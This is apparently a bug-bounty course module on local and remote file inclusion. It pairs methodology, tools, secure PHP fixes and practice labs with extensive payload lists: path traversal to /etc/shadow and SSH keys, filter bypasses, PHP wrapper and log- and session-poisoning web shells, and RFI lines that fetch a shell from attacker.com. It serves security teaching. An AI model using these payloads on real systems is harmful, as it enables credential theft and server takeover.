# 📁 Module 13: File Inclusion

> **Level:** 🔴 Advanced | **Time:** ~3 hours | **Prerequisites:** Module 01-12

---

## 📖 Overview

File inclusion vulnerabilities allow attackers to include arbitrary files in the application's execution context. Local File Inclusion (LFI) reads files from the server, while Remote File Inclusion (RFI) can execute code from a remote server. These are critical vulnerabilities that can lead to full server compromise.

---

## ❓ Why It Matters

LFI can expose sensitive configuration files, SSH keys, and password hashes. Combined with log poisoning or PHP wrappers, LFI can become Remote Code Execution. These vulnerabilities earn **$2,000 to $30,000+** on bug bounty platforms.

---

## 🌍 Real-World Example

A researcher found an LFI vulnerability in a media company's CMS via the `?page=` parameter. By chaining LFI with PHP session poisoning, they achieved remote code execution on the web server. The full server compromise earned a **$20,000 critical bounty**.

---

## 📋 Step-by-Step Methodology

### Finding File Inclusion

```
Look for parameters that reference files:
?page=home
?template=default
?include=header
?file=config
?path=/pages/about
?doc=manual.pdf

Test with:
?page=../../../../etc/passwd
?page=../../../etc/passwd
?page=/etc/passwd
```

### LFI to RCE Escalation Paths

```
1. PHP wrappers
2. Log file poisoning
3. /proc/self/environ poisoning
4. Session file poisoning
5. File upload + LFI combination
```

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| **Burp Suite** | Manual LFI testing |
| **ffuf** | Fuzzing file paths |
| **LFISuite** | Automated LFI testing |
| **wfuzz** | Path traversal fuzzing |

---

## 💡 Payload Examples

### Basic Path Traversal (LFI)

```
# Unix/Linux targets
../../../../etc/passwd
../../../etc/passwd
../../etc/passwd
/etc/passwd

# Absolute path
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/proc/version
/proc/self/environ
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/home/user/.ssh/id_rsa

# Windows targets
..\..\..\..\windows\win.ini
..\..\..\..\windows\system32\drivers\etc\hosts
C:\windows\win.ini
C:\Windows\System32\drivers\etc\hosts
```

### Filter Bypass Techniques

```
# Double encoding
%252e%252e%252f = ../
%252e%252e/ = ../
..%252f = ../

# URL encoding variations
%2e%2e%2f = ../
%2e%2e/ = ../
..%2f = ../
%2e%2e%5c = ..\

# Null byte (old PHP versions)
../../../etc/passwd%00
../../../etc/passwd%00.jpg

# Path truncation (old PHP)
../../../etc/passwd.....[many dots]

# Wrappers bypass
php://filter/read=convert.base64-encode/resource=config.php

# Unicode bypass
..%c0%af = ../
..%ef%bc%8f = ../
```

### PHP Wrappers

```php
# Read file contents as base64 (bypass some filters)
?page=php://filter/convert.base64-encode/resource=/etc/passwd
?page=php://filter/read=convert.base64-encode/resource=config.php

# Decode the result:
echo "BASE64_OUTPUT" | base64 -d

# Retrieve remote URL (if allow_url_include=On)
?page=php://input
# With POST body: <?php system($_GET['cmd']); ?>

# Data wrapper
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# Expect wrapper (if loaded)
?page=expect://id

# Zip wrapper
?page=zip://uploads/shell.zip#shell.php
```

### Log Poisoning (LFI to RCE)

```bash
# Step 1: Poison the log file by injecting PHP code in a header
curl -A "<?php system(\$_GET['cmd']); ?>" https://target.com

# User-Agent is logged in access.log

# Step 2: Include the log file via LFI
?page=/var/log/apache2/access.log&cmd=id

# Other poisonable log files
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/vsftpd.log
/proc/self/fd/1    # STDOUT
/proc/self/fd/2    # STDERR

# SSH log poisoning
ssh '<?php system($_GET["cmd"]); ?>'@target.com
# Then include: /var/log/auth.log
```

### Session File Poisoning

```php
# Step 1: Set a session variable with PHP code
# POST to login: username=<?php system($_GET['cmd']); ?>

# Step 2: Find session file path from phpinfo() or default paths
/var/lib/php/sessions/sess_SESSIONID
/tmp/sess_SESSIONID
/var/tmp/sess_SESSIONID

# Step 3: Include session file via LFI
?page=/var/lib/php/sessions/sess_abc123&cmd=id
```

### Remote File Inclusion (RFI)

```bash
# Only works if allow_url_include=On (rare in modern PHP)

# Host a PHP shell on attacker server
# File: shell.txt
<?php system($_GET['cmd']); ?>

# Include it via RFI
?page=http://attacker.com/shell.txt&cmd=id
?page=https://attacker.com/shell.txt&cmd=ls
?page=ftp://attacker.com/shell.txt&cmd=whoami
```

---

## 🛡️ Prevention

```php
// SECURE: Whitelist allowed files
$allowed_pages = ['home', 'about', 'contact'];
$page = $_GET['page'];

if (!in_array($page, $allowed_pages)) {
    die('Invalid page');
}

include("pages/" . $page . ".php");

// ALSO SECURE: Basename to prevent path traversal
$page = basename($_GET['page']);
include("pages/" . $page . ".php");

// Never do this:
include($_GET['page']);         // VULNERABLE
include("pages/" . $_GET['page'] . ".php");  // ALSO VULNERABLE
```

---

## 🧪 Practice Labs

| Lab | Link | Exercise |
|-----|------|---------|
| DVWA | localhost | File Inclusion module |
| TryHackMe | [tryhackme.com](https://tryhackme.com) | LFI/Path traversal rooms |
| PortSwigger | [portswigger.net/web-security/file-path-traversal](https://portswigger.net/web-security/file-path-traversal) | Path traversal labs |
| HackTheBox | [hackthebox.com](https://hackthebox.com) | LFI to RCE machines |

---

<div align="center">

[← Module 12: Insecure CORS](../12.%20Insecure%20CORS/README.md) | [Next Module: Server-Side Attacks →](../14.%20Server-Side%20Attacks/README.md)

</div>
